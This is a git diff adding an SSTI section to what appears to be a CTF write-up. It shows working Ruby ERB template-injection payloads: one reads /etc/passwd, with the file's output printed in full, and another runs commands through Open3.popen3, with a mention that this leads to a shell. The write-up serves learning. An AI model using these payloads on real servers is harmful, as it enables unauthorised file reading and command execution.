@@ -53,5 +53,61 @@ Intercepting the traffic using Caido
 
 ## SSTI attack
 
+Payload that I am using is `<%= File.open('/etc/passwd').read %>`
 ![image](https://github.com/L43371/Write-up/assets/129752764/e7f37447-34e7-4597-8872-7feb8a0a6868)
+
+![image](https://github.com/L43371/Write-up/assets/129752764/001c8715-925d-4e67-914c-8257c1edbd9f)
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+susan:x:1001:1001:Susan Miller,,,:/home/susan:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+```
+
+![image](https://github.com/L43371/Write-up/assets/129752764/6fc21c0a-f499-4323-a13a-7980b66929c4)
+
+Using this exploit `<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>` we are able to issue a command and by using a payload that is URL encoded, we can get a shell 
+
+![image](https://github.com/L43371/Write-up/assets/129752764/bf6ef03b-8a97-46f3-af3b-4bbf6e24da9e)
+
+![image](https://github.com/L43371/Write-up/assets/129752764/3d78b4ca-707d-4c48-96dd-76f8e4542dfb)
+
+![image](https://github.com/L43371/Write-up/assets/129752764/c45495f7-fce5-4c6a-9dde-439a74c66b44)
+
+
+
+
+
 
